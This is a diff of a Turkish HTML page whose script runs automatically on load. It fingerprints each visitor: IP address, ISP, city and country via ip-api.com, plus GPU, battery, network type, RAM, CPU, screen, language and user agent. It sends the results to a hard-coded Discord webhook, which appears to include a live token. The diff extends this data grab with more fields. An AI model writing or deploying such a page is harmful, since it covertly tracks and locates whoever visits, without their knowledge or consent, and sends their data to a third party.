@@ -2,80 +2,80 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Kayıtları</title>
+    <title>Sistem Veri Analizi</title>
 </head>
-<body style="background-color: #0c0c0c; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px;">
-    <h3>> SİSTEM VERİLERİ ÇEKİLİYOR...</h3>
-    <div id="console"></div>
+<body style="background-color: #000; color: #0f0; font-family: monospace; padding: 20px;">
+    <h3>[+] DERİN TARAMA BAŞLATILDI...</h3>
+    <div id="status">Veriler ayıklanıyor...</div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function derinAnaliz() {
-            const consoleLog = document.getElementById('console');
+        async function ultraScan() {
+            const status = document.getElementById('status');
             
             try {
-                // 1. Ağ ve Konum Verileri (Hızlı Servis)
+                // 1. Ağ ve IP Detayları (ip-api.com üzerinden)
                 const netRes = await fetch('http://ip-api.com/json/?fields=66846719');
                 const net = await netRes.json();
 
-                // 2. Pil ve Enerji Durumu
-                let pilDurumu = "Bilinmiyor";
+                // 2. GPU / Ekran Kartı Derinlik (Vendor ve Renderer)
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpuVendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_ID) : "Engellendi";
+                const gpuModel = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Engellendi";
+
+                // 3. Batarya ve Şarj
+                let bat = "Desteklenmiyor";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    pilDurumu = `%${Math.round(b.level * 100)} (Şarj: ${b.charging ? 'Evet' : 'Hayır'})`;
+                    bat = `%${Math.round(b.level * 100)} | Şarjda mı: ${b.charging ? 'Evet' : 'Hayır'}`;
                 }
 
-                // 3. GPU (Ekran Kartı) Derin Bilgi
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-                const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Erişim Engellendi";
+                // 4. Bağlantı Tipi (Wifi/4G)
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const netType = conn ? `Tip: ${conn.effectiveType} | Hız: ${conn.downlink}Mbps` : "Bilinmiyor";
 
-                // 4. Diğer Teknik Detaylar
-                const detaylar = {
-                    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Gizli/Bilinmiyor",
-                    cekirdek: navigator.hardwareConcurrency || "Bilinmiyor",
-                    platform: navigator.platform,
-                    dil: navigator.language,
-                    ekran: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
-                    dokunmatik: navigator.maxTouchPoints + " Nokta",
-                    saat: new Date().toLocaleString('tr-TR'),
-                    useragent: navigator.userAgent
+                // 5. Yazılım ve Tarayıcı Özellikleri
+                const soft = {
+                    cookies: navigator.cookieEnabled ? "Açık" : "Kapalı",
+                    pdfViewer: navigator.pdfViewerEnabled ? "Var" : "Yok",
+                    java: navigator.javaEnabled() ? "Aktif" : "Pasif",
+                    doNotTrack: navigator.doNotTrack === "1" ? "Açık" : "Kapalı",
+                    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Gizli",
+                    cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Çekirdek" : "Bilinmiyor"
                 };
 
-                // 5. Discord Raporu (Zengin İçerik)
-                const rapor = {
+                // 6. Discord Mesajını Oluştur (Embed)
+                const payload = {
                     embeds: [{
-                        title: "📂 KRİTİK CİHAZ LOGLARI",
-                        color: 3066993, // Yeşil
+                        title: "🚀 KRİTİK SİSTEM LOGLARI (TAM RAPOR)",
+                        color: 16711680,
                         fields: [
-                            { name: "🌐 NETWORK & IP", value: `**IP:** ${net.query}\n**ISS:** ${net.isp}\n**Konum:** ${net.city}/${net.country}\n**Mobil mi?:** ${net.mobile ? 'Evet' : 'Hayır'}`, inline: false },
-                            { name: "🖥️ DONANIM (HARDWARE)", value: `**GPU:** ${gpu}\n**RAM:** ${detaylar.ram}\n**İşlemci:** ${detaylar.cekirdek} Çekirdek\n**Ekran:** ${detaylar.ekran}`, inline: false },
-                            { name: "🔋 DURUM", value: `**Pil:** ${pilDurumu}\n**Dil:** ${detaylar.dil}\n**Touch:** ${detaylar.dokunmatik}`, inline: true },
-                            { name: "⚙️ SİSTEM", value: `**OS:** ${detaylar.platform}\n**Zaman:** ${detaylar.saat}`, inline: true },
-                            { name: "🕵️ TARAYICI KİMLİĞİ", value: "```" + detaylar.useragent + "```", inline: false }
+                            { name: "🌐 AĞ & LOKASYON", value: `**IP:** ${net.query}\n**ISS:** ${net.isp}\n**Konum:** ${net.city} / ${net.country}\n**Mobil:** ${net.mobile ? 'Evet' : 'Hayır'}\n**Bağlantı:** ${netType}`, inline: false },
+                            { name: "🖥️ DONANIM (HARDWARE)", value: `**İşlemci:** ${soft.cpu}\n**RAM:** ${soft.ram}\n**Ekran Kartı:** \`${gpuModel}\`\n**Üretici:** ${gpuVendor}`, inline: false },
+                            { name: "🔋 DURUM & PİL", value: bat, inline: true },
+                            { name: "📐 EKRAN", value: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`, inline: true },
+                            { name: "📄 YAZILIM DETAYLARI", value: `**Dil:** ${navigator.language}\n**Platform:** ${navigator.platform}\n**Çerezler:** ${soft.cookies}\n**DNT:** ${soft.doNotTrack}`, inline: false },
+                            { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
                         ],
-                        footer: { text: "Sistem Log Kaydı Aktif" }
+                        footer: { text: "Rapor Tarihi: " + new Date().toLocaleString('tr-TR') }
                     }]
                 };
 
-                const response = await fetch(webhookURL, {
+                await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(rapor)
+                    body: JSON.stringify(payload)
                 });
 
-                if (response.ok) {
-                    consoleLog.innerHTML = "<p style='color: white;'>[SUCCESS] Tüm veriler güvenli kanala aktarıldı.</p>";
-                }
-
+                status.innerText = ">>> TÜM VERİLER GÖNDERİLDİ.";
             } catch (err) {
-                consoleLog.innerHTML = "<p style='color: red;'>[ERROR] Veri çekme hatası: " + err + "</p>";
+                status.innerText = ">>> HATA: " + err;
             }
         }
-
-        window.onload = derinAnaliz;
+        window.onload = ultraScan;
     </script>
 </body>
 </html>
